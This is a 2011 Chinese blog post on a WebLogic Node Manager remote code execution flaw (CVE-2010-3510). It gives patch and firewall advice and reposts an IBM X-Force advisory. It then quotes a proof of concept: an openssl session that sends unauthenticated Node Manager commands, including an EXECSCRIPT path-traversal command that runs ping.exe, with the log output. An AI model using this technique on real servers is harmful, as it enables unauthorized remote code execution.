---
id: 2292
title: 'WebLogic NodeManager 远程攻击漏洞补丁下载[整理]'
date: 2011-10-19T20:56:00+00:00
author: 刘长炯
layout: post
guid: http://www.beansoft.biz/?p=2292
permalink: '/2011/10/19/weblogic-nodemanager-%e8%bf%9c%e7%a8%8b%e6%94%bb%e5%87%bb%e6%bc%8f%e6%b4%9e%e8%a1%a5%e4%b8%81%e4%b8%8b%e8%bd%bd%e6%95%b4%e7%90%86/'
views:
  - "7992"
original_post_id:
  - "2292"
image: /wp-content/uploads/2012/04/WebLogic.png
categories:
  - WebLogic
tags:
  - WebLogic
  - 漏洞
---
根据来自<http://xforce.iss.net/xforce/xfdb/64765>的报告,WebLogic的Node Manager有一个高危漏洞: Oracle WebLogic Server Node Manager code execution, 影响的版本包括了几乎所有最近版本的WebLogic软件:9.0, 9.1, 9.2.3, 10.0.2, 10.3.2, and 10.3.3.

解决办法:

1. 升级至最新的WebLogic 9.2.4或10.3.5.

2. 或下载对应的补丁: <http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html>

3. 或通过防火墙对相关端口和服务进行外网屏蔽. 

&#160;

Oracle的Critical Patch Updates and Security Alerts网站地址: <http://www.oracle.com/technetwork/topics/security/alerts-086861.html>

&#160;

相关资料转载:

<http://xforce.iss.net/xforce/xfdb/64765>

#### Oracle WebLogic Server Node Manager code execution

**weblogic-node-manager-code-exec (64765)**   
<img height="17" alt="The risk level is classified as High" src="http://www.iss.net/images/xforce/risk_high.gif" width="17" align="absMiddle" border="0" />High Risk

**Description:**

An unspecified vulnerability in Oracle WebLogic Server within the Node Manager could allow a remote attacker to execute arbitrary code on the system.

***CVSS:**

Base Score:   
10

&#160; Access Vector:   
Network

&#160; Access Complexity:   
Low

&#160; Authentication:   
None

&#160; Confidentiality Impact:   
Complete

&#160; Integrity Impact:   
Complete

&#160; Availability Impact:   
Complete

Temporal Score:   
7.4

&#160; Exploitability:   
Unproven

&#160; Remediation Level:   
Official-Fix

&#160; Report Confidence:   
Confirmed

**Consequences:**

Gain Access

**Remedy:**

Refer to Oracle Critical Patch Update Advisory &#8211; January 2011 for patch, upgrade or suggested workaround information. See References.

**References:**

  * [Oracle Critical Patch Update Advisory &#8211; January 2011](http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html): Oracle Critical Patch Update Advisory &#8211; January 2011. 
  * [**BID-45847**](http://www.securityfocus.com/bid/45847): Oracle WebLogic Server CVE-2010-3510 Remote Security Vulnerability 
  * [**CVE-2010-3510**](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3510): Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 9.0, 9.1, 9.2.3, 10.0.2, 10.3.2, and 10.3.3 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Node Manager. 
  * [**SA42975**](http://secunia.com/advisories/42975): Oracle WebLogic Server Three Vulnerabilities 
  * [**SECTRACK ID: 1024981**](http://securitytracker.com/id?1024981): Oracle Fusion Middleware Flaws Let Remote Users Execute Arbitrary Code, Access and Modify Data, and Deny Service 
  * [**VUPEN/ADV-2011-0143**](http://www.frsirt.com/english/advisories/2011/0143): Oracle Fusion Middleware Multiple Code Execution and Security Bypass

**Platforms Affected:**

  * Oracle WebLogic Server 10.3.2 
  * Oracle WebLogic Server 10.3.3 
  * Oracle WebLogic Server 9.0 
  * Oracle WebLogic Server 9.1

**Reported:**

Jan 19, 2011

The information within this database may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user&#8217;s risk. In no event shall the author/distributor (IBM Internet Security Systems X-Force) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.

For corrections or additions please email [xforce@iss.net](mailto:xforce@iss.net?Subject=weblogic-node-manager-code-exec%20(64765)%20feedback)

[Return to the main page](http://xforce.iss.net/)

* According to the Forum of Incident Response and Security Teams (FIRST), the Common Vulnerability Scoring System (CVSS) is an "industry open standard designed to convey vulnerability severity and help to determine urgency and priority of response." IBM PROVIDES THE CVSS SCORES "AS IS" WITHOUT WARRANTY OF ANY KIND, INCLUDING THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. CUSTOMERS ARE RESPONSIBLE FOR ASSESSING THE IMPACT OF ANY ACTUAL OR POTENTIAL SECURITY VULNERABILITY.   
The information within this database may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user&#8217;s risk. In no event shall IBM be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.

##### About IBM Internet Security Systems

IBM Internet Security Systems is a trusted security advisor to thousands of the world&#8217;s leading businesses and governments, helping to provide pre-emptive protection for networks, desktops and servers. The IBM Proventia? integrated security platform is designed to automatically protect against both known and unknown threats, helping to keep networks up and running and shield customers from online attacks before they impact business assets. IBM Internet Security Systems products and services are based on the proactive security intelligence of its X-Force? research and development team ? an unequivocal world authority in vulnerability and threat research. The IBM Internet Security Systems product line is also complemented by comprehensive Managed Security Services and Professional Security Services. For more information, visit the IBM Internet Security Systems Web site at www.iss.net or call 800-776-2362. 

&#160;

### Oracle Weblogic 10.3.2 Node Manager fun <http://www.nosec.org/2010/0209/395.html>

&#160;

Time for the final bug in our Week of Web Server bugs.   
It is in Vulndisco since Oct, 2008.   
Oracle Weblogic has an optional Node Manager utility which is used to start/stop server instances from a remo

Time for the final bug in our Week of Web Server bugs. 

It is in Vulndisco since Oct, 2008.

Oracle Weblogic has an optional Node Manager utility which is used to start/stop server instances from a remote location.

It is important to know that Node Manager is beasvc.exe process which listens on port 5556.

It supports several commands, no authentication is required to enter some of these commands, you will only need to know the name of Weblogic domain (btw in the default install Weblogic has at least 2 domains &#8211; wl_server and medrec). As beasvc.exe speaks over SSL we will use openssl utility:

character &#8216;>&#8217; marks the beginning of our command (write the command after &#8216;>&#8217; and press Enter)

$ openssl s_client -host 192.168.56.101 -port 5556

>HELLO asdf

+OK Node manager v10.3 started

Remote version leak bug here 😉

>DOMAIN xyz

-ERR I/O error while reading domain directory

>GETNMLOG

java.io.FileNotFoundException: Domain directory &#8216;C:OracleMiddlewarewlserver_10.3commonnodemanager&#8217; invalid (domain salt file not found)

at weblogic.nodemanager.server.DomainManager.initialize(DomainManager.java:79)

at weblogic.nodemanager.server.DomainMan
  
ager.(DomainManager.java:54)

at weblogic.nodemanager.server.NMServer.getDomainManager(NMServer.java:257)

at weblogic.nodemanager.server.Handler.handleDomain(Handler.java:218)

at weblogic.nodemanager.server.Handler.handleCommand(Handler.java:108)

at weblogic.nodemanager.server.Handler.run(Handler.java:70)

at java.lang.Thread.run(Thread.java:619)

>DOMAIN wl_server

+OK Current domain set to &#8216;wl_server&#8217;

**>EXECSCRIPT ../../../../../../../../Windows/System32/ping.exe**

-ERR 1

>GETNMLOG

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <Usage: ping \[-t\] \[-a\] \[-n count\] \[-l size\] \[-f\] \[-i TTL\] [-v TOS]>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; \[-r count\] \[-s count\] [[-j host-list] | [-k host-list]]>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; \[-w timeout\] \[-R\] \[-S srcaddr\] \[-4\] [-6] target_name>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <Options:>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -t&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Ping the specified host until stopped.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; To see statistics and continue &#8211; type Control-Break;>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; To stop &#8211; type Control-C.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -a&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Resolve addresses to hostnames.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -n count&#160;&#160;&#160;&#160;&#160;&#160; Number of echo requests to send.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -l size&#160;&#160;&#160;&#160;&#160;&#160;&#160; Send buffer size.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -f&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Set Don&#8217;t Fragment flag in packet (IPv4-only).>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -i TTL&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Time To Live.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -v TOS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Type Of Service (IPv4-only).>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -r count&#160;&#160;&#160;&#160;&#160;&#160; Record route for count hops (IPv4-only).>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -s count&#160;&#160;&#160;&#160;&#160;&#160; Timestamp for count hops (IPv4-only).>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -j host-list&#160;&#160; Loose source route along host-list (IPv4-only).>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -k host-list&#160;&#160; Strict source route along host-list (IPv4-only).>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -w timeout&#160;&#160;&#160;&#160; Timeout in milliseconds to wait for each reply.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -R&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Use routing header to test reverse route also (IPv6-only). >

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -S srcaddr&#160;&#160;&#160;&#160; Source address to use.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -4&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Force using IPv4.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <&#160;&#160;&#160; -6&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Force using IPv6.>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

<Jan 22, 2010 6:37:51 AM> <INFO> <>

.

+OK Node manager log file sent

Obviously it is a remote preauth command execution bug!

&#160;

NodeMangar 手工攻击: <http://book.51cto.com/art/201110/295927.htm>

转载请注明：[WebLogic Android 博客](http://www.beansoft.biz) &raquo; [WebLogic NodeManager 远程攻击漏洞补丁下载[整理]](http://www.beansoft.biz/2011/10/19/weblogic-nodemanager-%e8%bf%9c%e7%a8%8b%e6%94%bb%e5%87%bb%e6%bc%8f%e6%b4%9e%e8%a1%a5%e4%b8%81%e4%b8%8b%e8%bd%bd%e6%95%b4%e7%90%86/)